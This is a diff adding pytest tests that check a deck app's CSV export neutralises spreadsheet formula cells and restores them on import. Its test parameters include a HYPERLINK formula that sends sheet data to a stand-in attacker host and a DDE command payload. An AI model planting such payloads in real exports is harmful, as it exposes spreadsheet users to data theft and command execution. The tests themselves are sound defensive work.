@@ -11,7 +11,7 @@ import io
 
 import pytest
 
-from routes.decks import _export_filename
+from routes.decks import _csv_lead, _csv_unlead, _export_filename
 
 
 @pytest.fixture
@@ -97,6 +97,65 @@ def test_export_of_an_unknown_deck_is_404(client):
     # driver. Every deck endpoint resolves through DeckAccess now, which
     # coerces the id first -- see tests/test_deck_access.py.
     assert client.get("/api/decks/not-a-number/export").status_code == 404
+
+
+# ── A cell a spreadsheet would run ──
+#
+# The card text is the deck author's, and since the library it is not
+# necessarily the reader's own — so a card that a spreadsheet evaluates
+# as a formula is the author choosing what runs on the follower's
+# machine. Neutralised on the way out, restored on the way back in.
+
+
+@pytest.mark.parametrize("payload", [
+    '=HYPERLINK("https://evil.example/?"&A1,"click")',  # exfiltrates the sheet
+    '=cmd|\'/C calc\'!A1',                              # DDE, on older Excel
+    "+1+1",
+    "-1+1",
+    "@SUM(1:1)",
+])
+def test_export_neutralises_a_formula_cell(client, deck, payload):
+    added = client.post(f"/api/decks/{deck}/cards", json={"front": payload, "back": "x"})
+    assert added.status_code == 200, added.text
+
+    exported = client.get(f"/api/decks/{deck}/export")
+    assert exported.status_code == 200
+    (row,) = _rows(exported.content)
+    # The apostrophe is what stops the evaluation, so the cell must not
+    # reach the file still starting with its trigger character.
+    assert row["front"] == "'" + payload
+    assert not row["front"].startswith(tuple("=+-@"))
+
+
+def test_a_formula_card_still_round_trips(client, deck):
+    # The neutraliser must not cost the round trip this pair promises:
+    # the card comes back exactly as written, not one apostrophe longer.
+    payload = "-ますform"
+    assert client.post(f"/api/decks/{deck}/cards",
+                       json={"front": payload, "back": "polite"}).status_code == 200
+
+    exported = client.get(f"/api/decks/{deck}/export")
+    target = client.post("/api/decks", json={"name": "Round trip", "type": "standard"})
+    target_id = target.json()["id"]
+    try:
+        back = client.post(
+            f"/api/decks/{target_id}/import",
+            files={"file": ("deck.csv", exported.content, "text/csv")},
+        )
+        assert back.status_code == 200, back.text
+        listed = client.get(f"/api/decks/{target_id}/cards").json()["cards"]
+        assert [c["front"] for c in listed] == [payload]
+    finally:
+        client.delete(f"/api/decks/{target_id}")
+
+
+def test_lead_and_unlead_are_inverses():
+    for value in ("=1", "+1", "-1", "@1", "\tx", "\rx", "会議", "", "a=1", "'quoted"):
+        assert _csv_unlead(_csv_lead(value)) == value
+    # An apostrophe the AUTHOR typed is left alone: only one that
+    # precedes a trigger character was ours to add.
+    assert _csv_unlead("'quoted") == "'quoted"
+    assert _csv_lead("'quoted") == "'quoted"
 
 
 # ── The filename, which is user-authored and goes into a header ──
